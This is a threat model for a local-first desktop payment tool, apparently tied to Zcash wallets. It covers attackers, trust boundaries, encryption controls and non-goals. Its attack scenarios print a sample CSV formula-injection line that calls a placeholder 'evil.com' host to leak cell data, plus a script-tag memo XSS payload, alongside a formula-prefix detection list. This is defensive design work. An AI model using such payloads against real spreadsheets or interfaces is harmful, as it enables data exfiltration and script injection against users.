# THREAT MODEL

> **Scope:** Laminar Terminal (Desktop Application)  
> **Last Review:** Phase 1 Planning

---

## 1. Attackers

| Attacker | Capabilities | Mitigation |
|----------|--------------|------------|
| **Malicious CSV** | Inject formulas, XSS payloads, oversized memos | Sanitize-at-ingress, DOMPurify, formula prefix detection |
| **Compromised Device** | Read IndexedDB, clipboard, memory | Field encryption (INV-06), clear on logout, no key material (INV-01) |
| **Network Observer** | See traffic metadata, DNS queries | Local-first architecture, no external network requests (INV-09) |
| **Malicious Wallet** | Return false txid, phish user, reject valid requests | User confirms externally, display warnings, no trust in wallet response |
| **Supply Chain** | Compromised dependencies, typosquatting | Pinned versions, cargo/npm audit, reproducible builds |

---

## 2. Trust Boundaries

### Boundary 1: User → Terminal

**Input:** CSV files, JSON files, clipboard paste, manual entry

**Trust Level:** UNTRUSTED

**Controls:**
- All input sanitized before processing
- Formula injection detection (`=`, `+`, `-`, `@`, `\t`, `\r` prefixes)
- Schema validation against typed definitions
- Path traversal prevention on file operations

### Boundary 2: Terminal → Wallet

**Output:** QR codes (static/animated), deep links

**Trust Level:** FIRE-AND-FORGET

**Controls:**
- No response expected or processed from wallet
- User must independently verify transaction on wallet
- Handoff result is self-reported status only
- No assumption wallet will behave correctly

### Boundary 3: Terminal → IndexedDB

**Data:** Drafts, contacts, configuration

**Trust Level:** ENCRYPTED AT REST

**Controls:**
- Sensitive fields encrypted with AES-256-GCM (INV-06)
- Key derived from passphrase via PBKDF2 (100k iterations)
- No sensitive data persists unencrypted
- Clear sensitive memory on logout

---

## 3. Attack Scenarios

### 3.1 CSV Formula Injection

**Attack:** Malicious actor provides CSV with formula payloads:
```csv
address,amount,memo
=HYPERLINK("http://evil.com"&A1),10,payload
```

**Impact:** Code execution, data exfiltration (in spreadsheet apps)

**Mitigation:** 
- Detect formula prefixes at ingestion
- Reject rows starting with `=`, `+`, `-`, `@`, `\t`, `\r`
- Error code: `E009 CSV_FORMULA_INJECTION`

### 3.2 Memo XSS

**Attack:** Inject script tags or event handlers in memo field:
```csv
address,amount,memo
u1abc...,10,<script>alert('xss')</script>
```

**Impact:** Script execution in UI context

**Mitigation:**
- DOMPurify on all rendered content
- CSP blocks inline scripts
- Memo treated as opaque bytes, not rendered as HTML

### 3.3 Memory Inspection

**Attack:** Malware scans process memory for addresses/amounts

**Impact:** Privacy leak of payment details

**Mitigation:**
- Clear sensitive data structures after batch completion
- No key material ever in memory (INV-01)
- Minimize lifetime of parsed data

### 3.4 Dependency Compromise

**Attack:** Malicious code injected into upstream package

**Impact:** Arbitrary code execution, data exfiltration

**Mitigation:**
- Exact version pins in lock files
- `cargo audit` and `npm audit` in CI
- Review dependency updates manually
- Signed releases with checksums

---

## 4. Non-Goals

Laminar does **not** protect against:

| Scenario | Reason |
|----------|--------|
| Compromised mobile wallet | Out of scope—wallet security is wallet's responsibility |
| User sends to wrong address | User verifies recipient; Laminar validates format only |
| Key theft from mobile device | Keys never touch Laminar |
| Transaction confirmation | Wallet handles broadcast and confirmation |
| Custody or escrow | Laminar never holds funds |
| Funds recovery | Non-custodial by design |

---

## 5. Security Controls Summary

| Control | Implementation | Invariant |
|---------|----------------|-----------|
| No key material | Architecture prevents key access | INV-01 |
| No signing | No signing libraries imported | INV-02 |
| No broadcast | No network stack for Zcash p2p | INV-03 |
| Integer math | `u64`/`bigint` only for amounts | INV-04 |
| Schema validation | Zod/serde at all boundaries | INV-05 |
| Field encryption | AES-256-GCM for sensitive data | INV-06 |
| No telemetry | CSP + no analytics deps | INV-09 |
| Fail-fast | Entire batch rejected on error | INV-10 |

---

## 6. Security Review Schedule

| Phase | Review Type | Scope |
|-------|-------------|-------|
| Spike (Phase 1) | Engineering partner code review | `laminar-core` |
| Spike (Phase 1) | Community CTF bounty | Alpha release |
| Heavy Industry (Phase 2) | External tier-1 audit | Full codebase |
